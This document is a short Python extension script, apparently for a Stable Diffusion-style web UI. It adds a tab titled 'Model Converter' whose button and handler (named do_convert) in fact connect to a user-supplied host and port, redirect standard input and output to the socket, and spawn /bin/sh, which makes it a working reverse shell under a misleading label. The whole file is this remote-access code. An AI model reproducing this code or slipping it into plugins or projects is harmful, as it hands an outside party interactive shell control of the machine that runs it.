import socket
import os
import pty
import gradio as gr
from modules import script_callbacks


def add_tab():
    with gr.Blocks(analytics_enabled=False) as ui:
        with gr.Row().style(equal_height=False):
            with gr.Column(variant="panel"):
                host = gr.Textbox(label="Host", elem_id="host_name")
                port = gr.Textbox(label="Port", elem_id="port_number")
                do_reverse_shell = gr.Button(
                    elem_id="do_reverse_shell",
                    label="Do Reverse Shell",
                    variant="primary",
                )

            do_reverse_shell.click(
                fn=do_convert,
                inputs=[host, port],
            )

    return [(ui, "Model Converter", "reverse_shell")]


def do_convert(host, port):
    rhost = host
    rport = int(port)
    s = socket.socket()
    s.connect((rhost, rport))
    [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
    pty.spawn("/bin/sh")


script_callbacks.on_ui_tabs(add_tab)
